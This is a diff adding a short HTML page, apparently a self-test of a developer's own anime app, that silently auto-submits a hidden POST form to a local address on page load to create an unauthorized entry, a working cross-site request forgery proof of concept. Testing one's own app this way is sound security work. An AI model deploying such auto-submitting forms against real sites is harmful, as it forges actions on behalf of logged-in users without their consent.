@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test</title>
+</head>
+<body>
+    <h1>CSRF Attack Test</h1>
+    <p>This page will attempt to submit a form to your anime app without your permission.</p>
+
+    <form id="csrfForm" action="http://192.168.1.18/anime" method="POST">
+        <input type="hidden" name="title" value="CSRF Attack - Unauthorized Entry">
+        <input type="hidden" name="genre" value="Malicious">
+        <input type="hidden" name="status" value="Ongoing">
+        <input type="hidden" name="episodes" value="999">
+        <input type="hidden" name="rating" value="1.0">
+    </form>
+
+    <script>
+        // Auto-submit the form when page loads
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
